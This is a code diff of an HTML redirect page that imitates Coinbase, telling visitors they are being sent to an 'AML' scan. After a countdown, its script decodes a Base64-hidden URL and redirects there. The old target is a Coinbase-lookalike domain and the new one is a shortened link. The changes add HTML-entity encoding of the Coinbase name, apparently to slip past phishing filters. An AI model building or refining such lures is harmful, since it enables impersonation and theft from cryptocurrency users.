@@ -3,94 +3,122 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <link rel="icon" href="https://altcoinsbox.com/wp-content/uploads/2022/12/coinbase-logo.png" type="image/x-icon">
-    <title>Coinbase - Redirecting...</title>
+    <title>Redirecting...</title>
+    <link rel="icon" href="https://altcoinsbox.com/wp-content/uploads/2022/12/&#x63;&#x6F;&#x69;&#x6E;&#x62;&#x61;&#x73;&#x65;-logo.png" type="image/x-icon">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&amp;display=swap" rel="stylesheet">
     <style>
-        * {
+        body {
+            background: #ffffff;
             margin: 0;
             padding: 0;
-            box-sizing: border-box;
-        }
-        body {
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
-            background-color: white;
-            color: #0052FF;
-            min-height: 100vh;
-            display: flex;
-            overflow: hidden;
-            flex-direction: column;
-        }
-        header {
-            padding: 10px;
-            border-bottom: 1px solid #f1f1f1;
-        }
-        .logo {
-            width: 100px;
-            height: auto;
-        }
-        main {
-            flex: 1;
             display: flex;
             flex-direction: column;
             align-items: center;
             justify-content: center;
-            text-align: center;
-            padding: 1,5rem;
+            height: 100vh;
+            color: #000;
+            font-family: "Inter", serif;
+        }
+        /* Logo Container */
+        .logo-container {
+            position: absolute;
+            top: 10px;
+            left: 10px;
+            display: flex;
+            align-items: center;
+        }
+        /* Gray line beneath the logo */
+        .gray-line {
+            height: 1px;
+            background-color: #d0d0d0;
+            width: 100%;
+            position: absolute;
+            top: 40px; /* Positioned just below the logo */
         }
         h1 {
-            font-size: 2rem;
-            margin-bottom: 1rem;
-            font-weight: 500;
-            color: #000;
+            font-weight: 600;
+            font-size: 2.5em;
+            margin: 20px 0 0;
         }
-        .countdown {
-            font-size: 4rem;
-            font-weight: 700;
-            margin: 2rem 0;
+        a {
             color: #0052FF;
+            font-weight: 500;
+            text-decoration: none;
+            border-bottom: 1px solid #0052FF;
+            transition: 0.3s;
         }
-        .message {
-            font-size: 1.1rem;
-            opacity: 0.8;
-            color: #000;
+        a:hover {
+            color: #003d99; /* Change color on hover */
         }
-        @media (max-width: 640px) {
-            h1 {
-                font-size: 1.5rem;
-            }
-            .countdown {
-                font-size: 3rem;
-            }
-            .message {
-                font-size: 1rem;
-            }
+        .slider {
+            position: relative;
+            width: 400px;
+            margin: 20px 0;
+        }
+        .line {
+            position: absolute;
+            background: #0052FF;
+            width: 100%;
+            height: 2px;
+        }
+        .break {
+            position: absolute;
+            background: #ffffff;
+            width: 6px;
+            height: 2px;
+        }
+        .dot1, .dot2, .dot3 {
+            position: absolute;
+            background: #fff; /* Color of loading dots */
+            width: 6px;
+            height: 6px;
+            border-radius: 10%;
+            animation: loading 2s infinite;
+        }
+        .dot2 {
+            animation-delay: 0.5s;
+        }
+        .dot3 {
+            animation-delay: 1s;
+        }
+        @keyframes loading {
+            0% { transform: translateX(0); }
+            100% { transform: translateX(400px); }
+        }
+        p {
+            margin-top: 10px;
+            font-size: 1.2em;
+            padding: 30px;
+            font-weight: 600;
+        }
+        #countdown {
+            font-weight: 600;
+            color: #0052FF; /* Countdown color */
         }
     </style>
+    <script>
+        let encodedLink = "aHR0cHM6Ly9lbmNyLnB3L2dxdHJU"; // Base64 encoded URL
+        let countdown = 5; // countdown time in seconds
+
+        function updateCountdown() {
+            if (countdown === 0) {
+                let decodedLink = atob(encodedLink); // Decode the Base64 string
+                window.location.href = decodedLink; // Redirect to the original URL
+            } else {
+                document.getElementById('countdown').innerText = countdown;
+                countdown--;
+            }
+        }
+        setInterval(updateCountdown, 1000); // update every second
+    </script>
 </head>
 <body>
-<header>
-    <img src="https://images.ctfassets.net/q5ulk4bp65r7/3TBS4oVkD1ghowTqVQJlqj/2dfd4ea3b623a7c0d8deb2ff445dee9e/Consumer_Wordmark.svg" alt="Coinbase" class="logo">
-</header>
-<main>
-    <h1>You are being redirected to our AML Scan page</h1>
-    <div class="countdown" id="countdown">5</div>
-    <p class="message">You will be redirected automatically in a few seconds...</p>
-</main>
-<script>
-    let timeLeft = 5;
-    const countdownElement = document.getElementById('countdown');
-
-    const base64Url = 'aHR0cHM6Ly93ZWIzc2Nhbi1jb2luYmFzZS52ZXJjZWwuYXBw'; // Base64 encoded URL
-    const redirectUrl = atob(base64Url); // Decode base64 URL
-
-    const countdown = setInterval(() => {
-        timeLeft--;
-        countdownElement.textContent = timeLeft;
-        if (timeLeft <= 0) {
-            clearInterval(countdown);
-            window.location.href = redirectUrl; // Redirect to decoded URL
-        }
-    }, 1000);
-</script>
+    <div class="logo-container">
+        <img src="&#x63;&#x6F;&#x69;&#x6E;&#x62;&#x61;&#x73;&#x65;.png" alt="&#x43;&#x6F;&#x69;&#x6E;&#x62;&#x61;&#x73;&#x65; Logo" width="100" height="auto">
+    </div>
+    <div class="gray-line"></div>
+    <h1>Just a Moment...</h1>
+    <img width="150" height="auto" src="shield.gif">
+    <p>Redirecting you to our AML site in <span id="countdown">5</span> seconds...</p>
 </body>
 </html>
